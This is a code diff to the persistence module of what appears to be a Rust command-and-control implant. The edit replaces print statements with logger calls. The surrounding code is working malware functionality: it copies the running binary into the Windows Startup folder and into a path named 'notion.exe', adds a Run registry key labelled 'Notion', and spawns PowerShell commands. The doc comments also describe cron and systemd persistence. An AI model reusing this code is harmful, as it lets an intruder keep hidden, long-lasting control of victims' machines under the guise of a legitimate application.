@@ -10,6 +10,7 @@ use crate::cmd::{shell, save};
 #[cfg(windows)] use std::process::Command;
 #[cfg(windows)] use crate::cmd::getprivs::is_elevated;
 use crate::config::ConfigOptions;
+use crate::logger::Logger;
 
 
 /// Uses the specified method to establish persistence. 
@@ -25,7 +26,7 @@ use crate::config::ConfigOptions;
 /// 
 /// * `cron`: Writes a cronjob to the user's crontab and saves the agent in the home folder
 /// * `systemd`: Creates a systemd service and writes the binary someplace special
-pub async fn handle(s: &String, config_options: &mut ConfigOptions) -> Result<String, Box<dyn Error>> {
+pub async fn handle(s: &String, config_options: &mut ConfigOptions, logger: &Logger) -> Result<String, Box<dyn Error>> {
     // `persist [method] [args]`
     #[cfg(windows)] {
         match s.trim() {
@@ -35,7 +36,6 @@ pub async fn handle(s: &String, config_options: &mut ConfigOptions) -> Result<St
                     let mut persist_path: String = v;
                     persist_path.push_str(r"\Microsoft\Windows\Start Menu\Programs\Startup\notion.exe");
                     let exe_path = args().nth(0).unwrap();
-                    println!("{exe_path}");
                     // let mut out_file = File::create(path).expect("Failed to create file");
                     match fs_copy(&exe_path, &persist_path) {
                         Ok(b)  => { return Ok(format!("{b} bytes written to {persist_path}").to_string());},
@@ -50,15 +50,15 @@ pub async fn handle(s: &String, config_options: &mut ConfigOptions) -> Result<St
                     let mut persist_path: String = v;
                     persist_path.push_str(r"\notion.exe");
                     let exe_path = args().nth(0).unwrap();
-                    println!("{exe_path}");
+                    logger.debug(format!("Current exec path: {exe_path}"));
                     // let mut out_file = File::create(path).expect("Failed to create file");
                     fs_copy(&exe_path, &persist_path)?;
                     let hkcu = RegKey::predef(HKEY_CURRENT_USER);
                     let path = Path::new(r"Software\Microsoft\Windows\CurrentVersion\Run");
                     let (key, disp) = hkcu.create_subkey(&path)?;
                     match disp {
-                        REG_CREATED_NEW_KEY => println!("A new key has been created"),
-                        REG_OPENED_EXISTING_KEY => println!("An existing key has been opened"),
+                        REG_CREATED_NEW_KEY => logger.info("A new key has been created".to_string()),
+                        REG_OPENED_EXISTING_KEY => logger.info("An existing key has been opened".to_string()),
                     };
                     key.set_value("Notion", &persist_path)?;
                     Ok("Persistence accomplished".to_string())
@@ -85,7 +85,6 @@ pub async fn handle(s: &String, config_options: &mut ConfigOptions) -> Result<St
                                     ];
 
                                 for c in cmds {
-                                    println!("Arg: {c}");
                                     Command::new("powershell.exe")
                                     .arg(c)
                                     .spawn()?;
